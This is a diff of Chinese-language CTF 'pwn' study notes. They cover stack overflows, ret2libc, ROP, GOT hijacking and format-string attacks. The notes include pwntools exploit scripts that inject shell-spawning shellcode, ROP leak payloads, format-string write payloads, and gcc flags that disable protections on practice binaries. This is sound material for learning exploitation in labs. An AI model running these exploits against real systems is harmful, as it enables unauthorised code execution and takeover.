@@ -1057,18 +1057,24 @@ body .markdown-body
 .codehilite .gc{color:#999;background-color:#EAF2F5}
 </style><title>2019-03-26-PWN</title></head><body><article class="markdown-body"><div class="toc">
 <ul>
-<li><a href="#pwn">PWN</a><ul>
-<li><a href="#tips">Tips</a></li>
-<li><a href="#_1">配置环境</a></li>
-<li><a href="#_2">准备工具</a></li>
-<li><a href="#_3">解题思路</a><ul>
-<li><a href="#_4">学习路径</a></li>
-<li><a href="#_5">常见漏洞</a></li>
+<li><a href="#todo">TODO</a></li>
+<li><a href="#_1">推荐视频</a><ul>
+<li><a href="#cyclic">cyclic</a></li>
 </ul>
 </li>
-<li><a href="#_6">基础学习</a><ul>
-<li><a href="#_7">编译与执行</a><ul>
-<li><a href="#canary">关闭 canary 保护机制</a></li>
+<li><a href="#pwn">PWN</a><ul>
+<li><a href="#tips">Tips</a></li>
+<li><a href="#_2">配置环境</a></li>
+<li><a href="#_3">准备工具</a></li>
+<li><a href="#_4">解题思路</a><ul>
+<li><a href="#libcsearcher">LibcSearcher</a></li>
+<li><a href="#_5">学习路径</a></li>
+<li><a href="#_6">常见漏洞</a></li>
+</ul>
+</li>
+<li><a href="#_7">基础学习</a><ul>
+<li><a href="#_8">编译与执行</a><ul>
+<li><a href="#canary">关闭 canary等 保护机制</a></li>
 <li><a href="#gets-read">gets &amp; read</a></li>
 <li><a href="#stack-canary">Stack Canary</a></li>
 <li><a href="#bof-buffer-overflow">bof应用 (buffer overflow)</a></li>
@@ -1086,7 +1092,6 @@ body .markdown-body
 <li><a href="#lazy-binding">Lazy binding</a></li>
 <li><a href="#pltgot">plt&amp;got</a></li>
 <li><a href="#got-hijacking">GOT Hijacking</a></li>
-<li><a href="#exp">exp</a></li>
 </ul>
 </li>
 </ul>
@@ -1099,43 +1104,44 @@ body .markdown-body
 </li>
 <li><a href="#rop-gadget">ROP Gadget</a></li>
 <li><a href="#stack-migration">stack migration</a></li>
+<li><a href="#relo">RELO</a></li>
 <li><a href="#uaf">UAF原理</a></li>
-<li><a href="#todo">TODO</a></li>
+<li><a href="#todo_1">TODO</a></li>
 </ul>
 </li>
-<li><a href="#_8">常用命令</a></li>
+<li><a href="#_9">常用命令</a></li>
 <li><a href="#pwntools">pwntools</a><ul>
-<li><a href="#_9">本地启动</a></li>
-<li><a href="#_10">怎样调试</a></li>
-<li><a href="#_11">指令介绍</a></li>
-<li><a href="#_12">示例</a><ul>
-<li><a href="#_13">输入字符</a></li>
-<li><a href="#_14">汇编转二进制、数字、字符转换等</a></li>
+<li><a href="#_10">本地启动</a></li>
+<li><a href="#_11">怎样调试</a></li>
+<li><a href="#_12">指令介绍</a></li>
+<li><a href="#_13">示例</a><ul>
+<li><a href="#_14">输入字符</a></li>
+<li><a href="#_15">汇编转二进制、数字、字符转换等</a></li>
 <li><a href="#runshellcode">runshellcode</a></li>
 </ul>
 </li>
-<li><a href="#_15">相关知识</a></li>
+<li><a href="#_16">相关知识</a></li>
 </ul>
 </li>
 <li><a href="#one_gadget">one_gadget</a></li>
 <li><a href="#radare2">radare2使用</a></li>
-<li><a href="#_16">练习</a><ul>
+<li><a href="#_17">练习</a><ul>
 <li><a href="#1">1. 内存泄漏</a></li>
 <li><a href="#symbol-system">读取 symbol system的地址</a></li>
 </ul>
 </li>
 <li><a href="#wiki">Wiki</a><ul>
 <li><a href="#checksec">checksec 、 二进制保护机制</a></li>
-<li><a href="#_17">栈</a></li>
+<li><a href="#_18">栈</a></li>
 <li><a href="#c">C代码翻译</a></li>
 <li><a href="#c_1">C语言各数据类型大小和取值范围</a></li>
 <li><a href="#printf">printf</a><ul>
-<li><a href="#_18">$的作用</a></li>
+<li><a href="#_19">$的作用</a></li>
 <li><a href="#cgfsb">示例 CGfsb</a></li>
 </ul>
 </li>
 <li><a href="#plt-glt">PLT &amp; GLT</a></li>
-<li><a href="#_19">常用函数</a><ul>
+<li><a href="#_20">常用函数</a><ul>
 <li><a href="#read">read()</a></li>
 <li><a href="#write">write()</a></li>
 </ul>
@@ -1144,14 +1150,27 @@ body .markdown-body
 </li>
 </ul>
 </li>
+<li><a href="#ida">IDA查看栈底地址</a></li>
 </ul>
 </div>
+<h1 id="todo">TODO<a class="headerlink" href="#todo" title="Permanent link"></a></h1>
+<div class="codehilite"><pre>0x0804866b: mov DWORD PTR [esp], 0x8048740 ; 这里是put的参数, 使用 x/s 0x8048740查看值
+0x08048672: call 0x8048460 &lt;puts@plt&gt;
+</pre></div>
+
+<h1 id="_1">推荐视频<a class="headerlink" href="#_1" title="Permanent link"></a></h1>
+<p><a href="https://www.bilibili.com/video/BV1Db411y7g8?p=8">BambooFox-2018-2019年合集-107学年社课</a>
+<a href="https://www.bilibili.com/video/BV1SJ411s7MW">【CTF】NTUSTISC - Pwn 基础教程</a></p>
+<h2 id="cyclic">cyclic<a class="headerlink" href="#cyclic" title="Permanent link"></a></h2>
+<p>cyclic 200
+输入后看出错的地方，例0x62616164
+cyclic -l 0x62616164</p>
 <h1 id="pwn">PWN<a class="headerlink" href="#pwn" title="Permanent link"></a></h1>
 <p><a href="https://mp.weixin.qq.com/s/nFPCjsaUS8jNhluPvbR_8w">PWN-基础栈溢出题型</a></p>
 <h2 id="tips">Tips<a class="headerlink" href="#tips" title="Permanent link"></a></h2>
 <p><a href="https://blog.csdn.net/weixin_43868725/article/details/105962349#comments_12355290">scanf不接受非法字符</a>
 , 不能 p64(secret0_addr)+&rsquo;%77c%8$n&rsquo;。但是发现上一次输入的值100=0x64的偏移量为7。所以secret0_addr输入，构造payload=&rsquo;%85c%7$n&rsquo;，这样就可以向secret0_addr中写入85了，从而通过验证。</p>
-<h2 id="_1">配置环境<a class="headerlink" href="#_1" title="Permanent link"></a></h2>
+<h2 id="_2">配置环境<a class="headerlink" href="#_2" title="Permanent link"></a></h2>
 <p>PIP使用国内源</p>
 <div class="codehilite"><pre>mkdir ~/.pip/pip.conf
 vi ~/.pip/pip.conf
@@ -1165,14 +1184,21 @@ trusted-host=mirrors.aliyun.com
 
 
 <p>最后按esc, wq!回车保存</p>
-<h2 id="_2">准备工具<a class="headerlink" href="#_2" title="Permanent link"></a></h2>
+<h2 id="_3">准备工具<a class="headerlink" href="#_3" title="Permanent link"></a></h2>
 <p>Linux 下</p>
 <p>sudo pip3 install pwntools</p>
 <div class="codehilite"><pre>如果没有pip就先 sudo apt install python-pip
 </pre></div>
 
 
-<h2 id="_3">解题思路<a class="headerlink" href="#_3" title="Permanent link"></a></h2>
+<h2 id="_4">解题思路<a class="headerlink" href="#_4" title="Permanent link"></a></h2>
+<p>1.没有NX保护，程序源码自带系统命令函数：直接覆盖返回地址即可
+2.没有NX保护，可以找到system函数的plt的绝对地址：使用ret2text
+3.没有NX保护，找不到system函数，利用输入函数，将shellcode写入到程序中：ret2shellcode
+4.有NX保护，利用ROPGadget配合int 0x80调用execve:ret2Syscal1
+5.有NX保护，利用Libc获取system函数的相对位置：ret2Libc
+6.源码审计:
+    数组未检查。越界</p>
 <p>checksec 查看保护机制，no Stack-canary可以用shellcode。根据不同的保护机制来进行构造不同的payload</p>
 <div class="codehilite"><pre>如果安装了gdb peda, 进入gdb后 checksec filename
 </pre></div>
@@ -1188,12 +1214,40 @@ trusted-host=mirrors.aliyun.com
 
 
 <p>简单溢出思路: </p>
+<p>1、泄露一个ret2libc3函数的位置
+2、获取libc的版本（只有被执行过的函数才能获取地址）</p>
+<p>①https://lilbe.blukat.me ②LibcSearcher:<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a>
+3、根据偏移获取she11和sh的位置
+①求libc基地址（函数动态地址-函数偏移量）
+②求其他函数地址（基地址+函数偏移量）
+4、执行程序获取shell</p>
+<p>简单溢出操作: </p>
 <ol>
 <li>拖进ida, Shift+F12, Ctrl+F 搜flag</li>
 <li>有bin/sh,找溢出点通过system运行bin/sh的地址</li>
 <li>字符串格式化漏洞, 打印多个<code>.%x</code>来计算栈参数位置, 通过溢出或 %85c%7$n 给栈中第7个参数赋值来修改。</li>
 </ol>
-<h3 id="_4">学习路径<a class="headerlink" href="#_4" title="Permanent link"></a></h3>
+<h3 id="libcsearcher">LibcSearcher<a class="headerlink" href="#libcsearcher" title="Permanent link"></a></h3>
+<p>安装</p>
+<div class="codehilite"><pre>git clone https://github.com/lieanu/LibcSearcher.git
+cd LibcSearcher
+python setup.py develop
+</pre></div>
+
+
+<p>使用</p>
+<p>如果遇到返回多个1ibc版本库的情况，可以通过add_condition（leaked_func，leaked_address）来添加
+限制条件，也可以手工选择其中一个libc版本（如果你确定的话）。</p>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1"># 第二个参数，为已泄露的实际地址，或最后12位（比如:d90）, int类型</span>
+<span class="n">obj</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s">&quot;fgets&quot;</span><span class="p">,</span> <span class="mh">0x7ff39014bd90</span><span class="p">)</span>
+
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;system&quot;</span><span class="p">)</span> <span class="c1"># system偏移</span>
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;str_bin_sh&quot;</span><span class="p">)</span> <span class="c1"># /bin/sh 偏移</span>
+<span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">&quot;__libc_start_main_ret&quot;</span><span class="p">)</span>
+</pre></div>
+
+<h3 id="_5">学习路径<a class="headerlink" href="#_5" title="Permanent link"></a></h3>
 <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc">路径</a></p>
 <ol>
 <li>基本ROP</li>
@@ -1214,7 +1268,7 @@ trusted-host=mirrors.aliyun.com
 <p>ret2_dl_runtime_resolve</p>
 <p>SROP</p>
 <p>ret2VDSO</p>
-<h3 id="_5">常见漏洞<a class="headerlink" href="#_5" title="Permanent link"></a></h3>
+<h3 id="_6">常见漏洞<a class="headerlink" href="#_6" title="Permanent link"></a></h3>
 <ol>
 <li>
 <p>fgets(&amp;s, 32, edata); 限制了32位长度</p>
@@ -1243,7 +1297,7 @@ trusted-host=mirrors.aliyun.com
 </pre></div>
 
 
-<h2 id="_6">基础学习<a class="headerlink" href="#_6" title="Permanent link"></a></h2>
+<h2 id="_7">基础学习<a class="headerlink" href="#_7" title="Permanent link"></a></h2>
 <p><a href="https://www.csdn.net/gather_2a/MtTacg4sMDg1NS1ibG9n.html">参考</a></p>
 <p>比如有个函数vulnerable_function() 中执行一个读取操作时</p>
 <table>
@@ -1291,9 +1345,13 @@ system地址|假返回地址|执行参数(示例为bin/sh的地址)
 <p><a href="https://www.cnblogs.com/Rookle/p/12871878.html">栈未对齐引发Crash1</a></p>
 <p><strong>基本输入输出FD</strong></p>
 <p>fd的类型为int，值为0、1、2,分别代表标准输入、标准输出、标准错误输出。</p>
-<h3 id="_7">编译与执行<a class="headerlink" href="#_7" title="Permanent link"></a></h3>
-<h4 id="canary">关闭 canary 保护机制<a class="headerlink" href="#canary" title="Permanent link"></a></h4>
-<div class="codehilite"><pre>gcc test.c -fno-statckprotector -o test
+<p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">LINUX SYSTEM CALL TABLE FOR X86 64</a></p>
+<h3 id="_8">编译与执行<a class="headerlink" href="#_8" title="Permanent link"></a></h3>
+<p>程序执行顺序 start =&gt; __libc_start_main(main函数是从这里被call的), 所以stack有lib_c_start_main+231的ret addr</p>
+<h4 id="canary">关闭 canary等 保护机制<a class="headerlink" href="#canary" title="Permanent link"></a></h4>
+<div class="codehilite"><pre>gcc test.c -fno-statckprotector -o bof
+gcc test.c -fno-statckprotector -no-pie -o bof
+gcc test.c -fno-statckprotector -no-pie -z execstack -o ret2sc
 </pre></div>
 
 
@@ -1501,15 +1559,16 @@ VV 进入视图模式
 <img alt="" src="imgs/pwn_stack07.jpg" /></p>
 <h5 id="address">如何找到address? 如何查找函数<a class="headerlink" href="#address" title="Permanent link"></a></h5>
 <p>三种方式
-<div class="codehilite"><pre>shell<span class="nv">$ </span>objdump -M intel -d filename <span class="p">|</span> less
-shell<span class="nv">$ </span>objdump -d filename
+<div class="codehilite"><pre>sh<span class="nv">$ </span>objdump -M intel -d filename <span class="p">|</span> less
+sh<span class="nv">$ </span>objdump -d filename
+sh<span class="nv">$ </span>objdump -d -j .plt ./ret2libc3 <span class="p">|</span> grep system     //查找system的plt地址
+sh<span class="nv">$ </span>ROPgadget --binary ./ret2libc3 --string <span class="s2">&quot;/bin/sh&quot;</span>       // 查找bin_sh字符串地址
 gdb-peda<span class="nv">$ </span>p shell
 r2<span class="nv">$ </span>afl~shell
 </pre></div>
 反汇编语法设置默认为AT&amp;T改为Intel语法： 相当于-M
 <div class="codehilite"><pre>set disassembly-flavor intel&gt;~/.gdbinit
 </pre></div></p>
-<p>查找bni_sh字符串地址: ROPgadget &ndash;binary ./ret2libc3 &ndash;string</p>
 <p>retn 返回stack栈顶的地址
 <div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./bof&#39;</span><span class="p">)</span>
@@ -1543,6 +1602,10 @@ r2<span class="nv">$ </span>afl~shell
 <p>vmap查看, 开启NX导致w,x不会同时开启。</p>
 <p><img alt="" src="imgs/pwn_stack10.jpg" /></p>
 <p><img alt="" src="imgs/pwn_ret2sc.jpg" /></p>
+<p><img alt="" src="imgs/pwn_ret2shellcode.jpg" /></p>
+<p>可参见 LINUX SYSTEM CALL TABLE FOR X86 64</p>
+<p>exp见 <a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/scripts/pwn_01_01ret2shellcode2.py">pwn_01_01ret2shellcode2</a></p>
+<p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly">在线转换</a></p>
 <h5 id="shellcode">哪里可以写shellcode?<a class="headerlink" href="#shellcode" title="Permanent link"></a></h5>
 <ul>
 <li>
@@ -1584,7 +1647,8 @@ r2<span class="nv">$ </span>afl~shell
 <p>.got存放着全局变量引用，</p>
 <p>.got.plt 存放着函数引用。</p>
 <p>查看<code>test@plt</code>用<code>objdump -Mintel -d -j .plt got</code></p>
-<p>-j 选项后面跟上节名。指定节</p>
+<p>-j 指定节。
+-j .plt 查找符号表</p>
 <h5 id="got-hijacking">GOT Hijacking<a class="headerlink" href="#got-hijacking" title="Permanent link"></a></h5>
 <ul>
 <li>
@@ -1594,12 +1658,27 @@ r2<span class="nv">$ </span>afl~shell
 <p>不能是Full RELRO</p>
 </li>
 </ul>
-<p><img alt="" src="imgs/pwn_plt%26got2.jpg" /></p>
-<h5 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link"></a></h5>
+<p><img alt="" src="imgs/pwn_plt%26got2.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking1.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking2.jpg" />
+<img alt="" src="imgs/pwn_GOT_Hijacking3.jpg" /></p>
+<p>source: <a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/pwn_gothijack.c">pwn_gothijack</a></p>
+<p>exp</p>
 <div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./bof2&#39;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./gothijack&#39;</span><span class="p">)</span>
 
-<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;?</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">&#39;amd64&#39;</span>
+
+<span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;?</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">))</span> <span class="c1"># </span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">))</span> <span class="c1"># 已被shellcode覆盖的原plt地址,</span>
 </pre></div>
 
 <h3 id="fmt">fmt<a class="headerlink" href="#fmt" title="Permanent link"></a></h3>
@@ -1657,6 +1736,11 @@ TODO gdb 源码调试</p>
 </li>
 <li>
 <p>rdi, rsi, rdx, rcx, r8, r9, STACK</p>
+<ul>
+<li>x64 calling convention</li>
+<li>rdi, rsi, rdx, r10, r8, r9, (push to stack) for system call</li>
+<li>return value is stored in rax</li>
+</ul>
 </li>
 <li>rdi -&gt; fmt</li>
 <li>%d, %p, %s, %c, %x -&gt; read data on the stack</li>
@@ -1785,7 +1869,14 @@ ret
 </pre></div>
 
 
-<p>% ROPgadget &ndash;binary ./test | grep &lsquo;pop rax.*ret&rsquo;</p>
+<div class="codehilite"><pre>ROPgadget --binary ./test | grep &#39;pop rax.*ret&#39;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot; | grep &quot;eax&quot;
+ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot;
+ROPgadget --binary ./ret2libc3 --string &quot;/bin/sh&quot;
+</pre></div>
+
+<p><img alt="Alt text" src="imgs/pwn_02_ROPgaget.jpg" /></p>
 <h3 id="stack-migration">stack migration<a class="headerlink" href="#stack-migration" title="Permanent link"></a></h3>
 <ul>
 <li>ROP chain</li>
@@ -1809,13 +1900,22 @@ ret-&gt;跳到新的rop chain
 <li>将Stack搬到可存储ROP playload的地方</li>
 <li>在有限的情况下，利用stack migration让ROP持续活下去</li>
 </ul>
+<h3 id="relo">RELO<a class="headerlink" href="#relo" title="Permanent link"></a></h3>
+<ul>
+<li>Relocation Read-Only</li>
+<li>Partial RELRO</li>
+<li>GOT可寫</li>
+<li>Full RELRO</li>
+<li>Load time時會將所有function resolve完畢</li>
+<li>GOT不可寫</li>
+</ul>
 <h3 id="uaf">UAF原理<a class="headerlink" href="#uaf" title="Permanent link"></a></h3>
 <p><a href="https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w">https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w</a></p>
-<h3 id="todo">TODO<a class="headerlink" href="#todo" title="Permanent link"></a></h3>
+<h3 id="todo_1">TODO<a class="headerlink" href="#todo_1" title="Permanent link"></a></h3>
 <p>明显的stack/heap/int 溢出, string format,off-by-one/UAF/house of XXX/xxbin attack
 抽象成：对内存地址的读写
 漏洞利用: shellcode/GOT/vtable/hook_function/onegadget</p>
-<h2 id="_8">常用命令<a class="headerlink" href="#_8" title="Permanent link"></a></h2>
+<h2 id="_9">常用命令<a class="headerlink" href="#_9" title="Permanent link"></a></h2>
 <p><a href="https://blog.csdn.net/weixin_42072280/article/details/90229294">checksec</a> <code>[filename]</code></p>
 <div class="codehilite"><pre>/Downloads/level0&#39;
     Arch:     amd64-64-little # 64位
@@ -1832,10 +1932,10 @@ ret-&gt;跳到新的rop chain
 <p>ldd filename  通过ldd查找libc共享库</p>
 <h2 id="pwntools">pwntools<a class="headerlink" href="#pwntools" title="Permanent link"></a></h2>
 <p><a href="https://www.jianshu.com/p/6e528b33e37a">Link</a></p>
-<h3 id="_9">本地启动<a class="headerlink" href="#_9" title="Permanent link"></a></h3>
+<h3 id="_10">本地启动<a class="headerlink" href="#_10" title="Permanent link"></a></h3>
 <p>nc -vc ./fmt -kl 3333</p>
 <p>然后其他机器就可以nc ip port连接了</p>
-<h3 id="_10">怎样调试<a class="headerlink" href="#_10" title="Permanent link"></a></h3>
+<h3 id="_11">怎样调试<a class="headerlink" href="#_11" title="Permanent link"></a></h3>
 <p>方法1</p>
 <p><div class="codehilite"><pre><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s">&#39;debug&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pwn&#39;</span><span class="p">)</span>
@@ -1849,7 +1949,7 @@ ret-&gt;跳到新的rop chain
 <span class="err">$</span><span class="n">gdb</span>
 <span class="err">$</span><span class="n">attach</span> <span class="mi">6533</span>
 </pre></div></p>
-<h3 id="_11">指令介绍<a class="headerlink" href="#_11" title="Permanent link"></a></h3>
+<h3 id="_12">指令介绍<a class="headerlink" href="#_12" title="Permanent link"></a></h3>
 <p>p32、p64是64/32位代码 打包为二进制，u32、u64是解包为二进制</p>
 <p><strong>flat模块能将pattern字符串和地址结合并且转为字节模式</strong></p>
 <div class="codehilite"><pre><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="mh">0x804a060</span><span class="p">)</span>
@@ -1863,7 +1963,7 @@ ELF(&#39;./level3&#39;).sym[&#39;main&#39;]
 
 
 <p>gdb.attach(sh) # gdb附加到调试</p>
-<h3 id="_12">示例<a class="headerlink" href="#_12" title="Permanent link"></a></h3>
+<h3 id="_13">示例<a class="headerlink" href="#_13" title="Permanent link"></a></h3>
 <div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">&#39;linux&#39;</span><span class="p">)</span> <span class="c1"># 能显示调试信息</span>
 <span class="c1">#io = process(&#39;./level1&#39;) </span>
@@ -1884,7 +1984,7 @@ ELF(&#39;./level3&#39;).sym[&#39;main&#39;]
 <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
 <span class="c1"># payload = flat(&#39;a&#39;*0x88, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因</span>
 </pre></div></p>
-<h4 id="_13">输入字符<a class="headerlink" href="#_13" title="Permanent link"></a></h4>
+<h4 id="_14">输入字符<a class="headerlink" href="#_14" title="Permanent link"></a></h4>
 <div class="codehilite"><pre><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&#39;name&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;your name&quot;</span><span class="p">)</span>
@@ -1893,7 +1993,7 @@ ELF(&#39;./level3&#39;).sym[&#39;main&#39;]
 <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
 </pre></div>
 
-<h4 id="_14">汇编转二进制、数字、字符转换等<a class="headerlink" href="#_14" title="Permanent link"></a></h4>
+<h4 id="_15">汇编转二进制、数字、字符转换等<a class="headerlink" href="#_15" title="Permanent link"></a></h4>
 <p><div class="codehilite"><pre><span class="c1"># python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="k">print</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">&#39;XCHG EAX,ESP</span><span class="se">\n</span><span class="s">RET</span><span class="se">\n</span><span class="s">MOV ECX,[EAX]</span><span class="se">\n</span><span class="s">MOV [EDX],ECX</span><span class="se">\n</span><span class="s">POP EBX</span><span class="se">\n</span><span class="s">RET&#39;</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
@@ -1913,7 +2013,7 @@ p32
 <span class="n">run_shellcode</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
 </pre></div>
 
-<h3 id="_15">相关知识<a class="headerlink" href="#_15" title="Permanent link"></a></h3>
+<h3 id="_16">相关知识<a class="headerlink" href="#_16" title="Permanent link"></a></h3>
 <p>通过ldd查找libc共享库， 这里python需要用到c语言的标准动态库, srand用到libc.so.6
 <div class="codehilite"><pre>kali@kali:/mnt/hgfs/vmware<span class="nv">$ </span>ldd guess_num 
         linux-vdso.so.1 <span class="o">(</span>0x00007ffec67fa000<span class="o">)</span>
@@ -1946,7 +2046,7 @@ local_10h 改为 input
 <p>aa 分析
 aaa 分析 一般用这个够了
 aaaa 分析</p>
-<h2 id="_16">练习<a class="headerlink" href="#_16" title="Permanent link"></a></h2>
+<h2 id="_17">练习<a class="headerlink" href="#_17" title="Permanent link"></a></h2>
 <h4 id="1">1. 内存泄漏<a class="headerlink" href="#1" title="Permanent link"></a></h4>
 <p>1.内存泄漏 xman_level0 <a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d">file</a></p>
 <div class="codehilite"><pre>nc pwn2.jarvisoj.com 9881
@@ -2071,7 +2171,7 @@ typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked,
 <p><strong>5.RelRO</strong></p>
 <p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
 <p>0x02 <a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">参考</a></p>
-<h3 id="_17">栈<a class="headerlink" href="#_17" title="Permanent link"></a></h3>
+<h3 id="_18">栈<a class="headerlink" href="#_18" title="Permanent link"></a></h3>
 <p>参数入栈方式是从右向左。</p>
 <p><img alt="Alt text" src="imgs/pwn_stack01.jpg" /></p>
 <p><img alt="Alt text" src="imgs/pwn_01_stack01.jpg" /></p>
@@ -2327,7 +2427,7 @@ int (){
 <p>%85c%7$n ，作用是将85写入栈内第7个参数所指向的地址。</p>
 <p>在 printf 中，使用 <code>*&lt;a_number_of_chars&gt;%&lt;number&gt;$n*</code> 就可以将相应的第 <code>*&lt;number&gt;*</code> 个参数的位置写为 % 前输出的字符数量</p>
 <p>如本题先用 %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85</p>
-<h4 id="_18">$的作用<a class="headerlink" href="#_18" title="Permanent link"></a></h4>
+<h4 id="_19">$的作用<a class="headerlink" href="#_19" title="Permanent link"></a></h4>
 <p>Linux下, x$指栈第x个参数的地址, 下面2$指第2个地址, $1指第一个地址. 即输出2, 3
 <div class="codehilite"><pre>    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%2$d %1$d&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
@@ -2395,7 +2495,7 @@ send(payload)后
 </table>
 <p>联合出手完成重定位。</p>
 <p><img alt="" src="imgs/C01.jpg" title="Optional title" /></p>
-<h3 id="_19">常用函数<a class="headerlink" href="#_19" title="Permanent link"></a></h3>
+<h3 id="_20">常用函数<a class="headerlink" href="#_20" title="Permanent link"></a></h3>
 <h4 id="read">read()<a class="headerlink" href="#read" title="Permanent link"></a></h4>
 <p>用于文件描述符对应的文件中读取数据，原型：</p>
 <p><code>ssize_t read(int fd,void*buf,size_t count)</code></p>
@@ -2432,4 +2532,23 @@ ps： 写常规文件时，write的返回值通常等于请求写的字节
 </pre></div>
 
 
-<p>因此，read函数就可以取代scanf从command line读取数据；write函数就可以代替printf，往command line打印输出。</p></article></body></html>
+<p>因此，read函数就可以取代scanf从command line读取数据；write函数就可以代替printf，往command line打印输出。</p>
+<h1 id="ida">IDA查看栈底地址<a class="headerlink" href="#ida" title="Permanent link"></a></h1>
+<p>xctf stack2示例
